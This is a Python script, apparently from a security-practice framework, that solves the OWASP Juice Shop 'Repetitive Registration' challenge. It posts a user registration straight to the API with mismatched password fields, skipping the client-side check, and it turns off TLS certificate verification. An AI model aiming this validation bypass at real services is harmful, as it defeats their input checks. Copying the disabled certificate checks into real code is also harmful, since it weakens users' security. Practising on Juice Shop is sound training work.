"""
This file is used to solve the OWASP Juice-shop Task REPETITIVE REGISTRATION
Principle: If we have successfully repeated our password, we can change the first password
Methodology: If we are using request, we can avoid the checking.
"""

import requests

from plugins import attack as a
from header_config import *
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class test_repetitive_registration(a.attack_inter):
    def __init__(self):
        pass

    def generator(self):
        cookies = COOKIE

        headers = HEADER

        json_data = {
            'email': 'test_8eee@gmail.com', # remark: you need to creat a new email each time!!
            'password': '123456',
            'passwordRepeat': '12345',
            'securityQuestion': {
                'id': 2,
                'question': 'Mother\'s maiden name?',
            },
            'securityAnswer': 'test',
        }

        return cookies, headers, json_data

    def run(self):
        cookies, headers, json_data = self.generator()
        response = a.requests.post('https://juice-shop.herokuapp.com/api/Users/', cookies=cookies, headers=headers, json=json_data, verify=False)
        print(response.status_code)
        if response.status_code == 200:
            res_payload_dict = response.json()
            print("Valid script: ", json_data['email'])
            print(res_payload_dict)


